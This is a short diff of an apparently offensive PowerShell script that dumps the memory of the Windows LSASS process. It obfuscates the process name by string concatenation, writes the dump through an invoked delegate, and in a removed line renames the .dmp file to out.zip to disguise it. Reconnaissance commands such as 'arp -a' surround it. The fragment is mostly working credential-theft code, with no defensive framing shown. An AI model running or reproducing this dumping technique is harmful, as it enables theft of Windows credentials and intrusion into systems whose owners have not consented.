@@ -11,7 +11,6 @@ arp -a
 cd "C:\temp";ls
 $R = $D.Invoke($null, @((gps ("l"+"sas"+"s")).Handle,$G,$F.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))
 $F.Close()
-mv "C:\temp\ls_$((gps ("l"+"sas"+"s")).Id).dmp" "C:\temp\out.zip"
 cd "C:\temp";ls
 
 
